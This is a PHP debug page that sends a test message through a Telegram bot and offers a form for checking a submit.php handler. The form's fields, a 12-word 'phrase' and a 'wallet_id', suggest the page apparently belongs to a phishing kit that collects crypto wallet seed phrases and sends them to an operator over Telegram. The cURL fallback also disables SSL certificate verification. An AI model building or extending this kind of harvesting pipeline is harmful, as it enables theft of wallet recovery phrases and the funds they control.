<?php
/**
 * FINAL SIMPLE TEST - Just sends a plain message
 * Visit: https://yourdomain.com/FINAL_TEST.php
 */

require_once 'config.php';

// SIMPLEST POSSIBLE TEST - Just plain text
$url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";

$data = array(
    'chat_id' => TELEGRAM_CHAT_ID,
    'text' => "TEST MESSAGE - " . date('H:i:s')
);

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);

$context  = stream_context_create($options);
$result = @file_get_contents($url, false, $context);

if ($result === FALSE) {
    // Try with cURL instead
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
}

header('Content-Type: text/html');
?>
<!DOCTYPE html>
<html>
<head>
    <title>Final Test</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
        .box { background: white; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .success { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; }
        .error { background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; }
        pre { background: #f4f4f4; padding: 10px; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Final Telegram Test</h1>
        
        <h2>Configuration:</h2>
        <p>Bot Token: <?php echo substr(TELEGRAM_BOT_TOKEN, 0, 20); ?>...</p>
        <p>Chat ID: <?php echo TELEGRAM_CHAT_ID; ?></p>
        <p>URL: <?php echo $url; ?></p>
        
        <h2>Result:</h2>
        <?php
        $json = json_decode($result, true);
        
        if ($json && isset($json['ok']) && $json['ok'] === true) {
            echo '<div class="success">';
            echo '<h3>✅ SUCCESS!</h3>';
            echo '<p>Message sent successfully! Check your Telegram now.</p>';
            echo '<p>Message ID: ' . ($json['result']['message_id'] ?? 'N/A') . '</p>';
            echo '</div>';
        } else {
            echo '<div class="error">';
            echo '<h3>❌ FAILED</h3>';
            if ($json && isset($json['description'])) {
                echo '<p><strong>Error:</strong> ' . htmlspecialchars($json['description']) . '</p>';
                echo '<p><strong>Error Code:</strong> ' . ($json['error_code'] ?? 'N/A') . '</p>';
            } else {
                echo '<p>No response from Telegram API</p>';
            }
            echo '</div>';
        }
        ?>
        
        <h2>Raw Response:</h2>
        <pre><?php echo htmlspecialchars($result); ?></pre>
        
        <h2>Test Form Submission:</h2>
        <form method="POST" action="submit.php" style="margin-top: 20px;">
            <textarea name="phrase" rows="3" style="width: 100%; padding: 10px;">test word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12</textarea>
            <input type="hidden" name="wallet_id" value="Final Test">
            <button type="submit" style="margin-top: 10px; padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Test submit.php</button>
        </form>
    </div>
</body>
</html>

